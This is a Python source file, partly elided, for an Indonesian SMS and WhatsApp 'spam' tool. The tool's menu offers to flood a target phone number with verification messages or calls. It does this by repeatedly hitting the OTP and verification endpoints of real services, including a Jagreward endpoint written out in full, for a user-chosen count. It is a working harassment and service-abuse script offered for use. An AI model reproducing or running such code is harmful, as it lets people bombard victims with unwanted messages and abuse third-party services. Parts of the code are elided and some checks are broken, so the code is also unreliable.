...
def mr_dark_input():
    ...
    if subs_mr_dark == "1":
         dark_point = 1
         print ("\033[1;97m<═════════════[ •\33[32;1m PROSES\033[1;97m • ]══════════════>")
         telkom_0 = input("   [\33[31;1m#\33[33;1m\033[1;97m]\033[1;97m No Target: 0")
         jumlah = int(input("   [\33[31;1m#\33[33;1m\033[1;97m]\033[1;97m Jumlah: "))
         ...
         for i in range(int(jumlah)):
             ...
             if 'Field ini harus diisi dengan nomor Telkomsel' in darko:
                  print ('   [\33[31;1m#\33[33;1m]\033[1;97m No Target Harus Menggunakan Telkomsel!  ')
                  time.sleep(2)
                  print ("\033[1;97m<═════════════[ •\33[32;1m PROSES\033[1;97m • ]═══════════════>")
                  break
             if 'Maaf, Anda belum melakukan konfirmasi OTP di transaksi sebelumnya, silakan coba kembali setelah 1 menit' in darko:
                  print ('   [\33[31;1m#\33[31;1m\033[1;97m] Tidak dapat terkirim di karenakan inquiryId sedang di gunakan!, Mohon Coba Lagi!  ')
             else:
         ...
         dark_point = 1
         print ("\033[1;97m<════════════[ •\33[32;1m PROSES\033[1;97m • ]══════════════>")
         xl_0 = input("   [\33[31;1m#\33[33;1m]\033[1;97m No Target: 0")
         no = ("0"+xl_0)
         jumlah = int(input("   [\33[31;1m#\33[33;1m]\033[1;97m Jumlah: "))
         ...
         dark_point = 1
         print ("\033[1;97m<════════════[ •\33[32;1m PROSES\033[1;97m • ]══════════════>")
         drknom = input("   [\33[31;1m#\33[33;1m]\033[1;97m No Target: 0")
         no = ("0"+drknom)
         jumlah = int(input("   [\33[31;1m#\33[33;1m]\033[1;97m Jumlah: "))
         hd = {
         ...
         for i in range(int(jumlah)):
             dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+drknom)
             dark_json = json.loads(dark_request.text)
             if '\33[32;1mAnda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.' in dark_request:
                  print (f"   [{dark_point}] Terkirim ")
                  time.sleep(30)
                  dark_point += 1
             else:
                  print (f'   [{dark_point}] \33[31;1mTidak dapat terkirim di karenakan sudah limit! ')
                  time.sleep(30)
                  dark_point += 1
def banner_anjay_subs_mr_dark():


    print ("  \033[1;95m ╔═╗\033[1;97m┌─┐┌─┐┌┬┐    \033[1;95m ╔═╗\033[1;97m┌─┐┬ ┬")
    print ("  \033[1;95m ╚═╗\033[1;97m├─┘├─┤│││ ─── \033[1;95m╚═╗\033[1;97m│  │││")
    print ("  \033[1;95m ╚═╝\033[1;97m┴  ┴ ┴┴ ┴     \033[1;95m╚═╝\033[1;97m└─┘└┴┘")
    print ("")
    print ("    >\033[1;95m Author   :\033[1;97m ERI ")
    print ("    >\033[1;95m Facebook :\033[1;97m Eri Kdr ")
    print ("    >\033[1;95m Github   :\033[1;97m github.com/Eri-bit ")
    print ("")
    print ("   \33[37;1m > Status Otp :\33[32;1m Free")
    print ("   \33[37;1m > Version :\33[32;1m 1.6")
    print ("")
    print ("   \33[95;1m 1 .\033[1;97m Spam Sms (DuniaGames) Pengguna Telkomsel ")
    print ("   \33[95;1m 2 .\033[1;97m Spam Sms (Jagreward) ")
    print ("   \33[95;1m 3 .\033[1;97m Spam Whatsapp (Tokopedia) ")
    print ("")
    mr_dark_input()
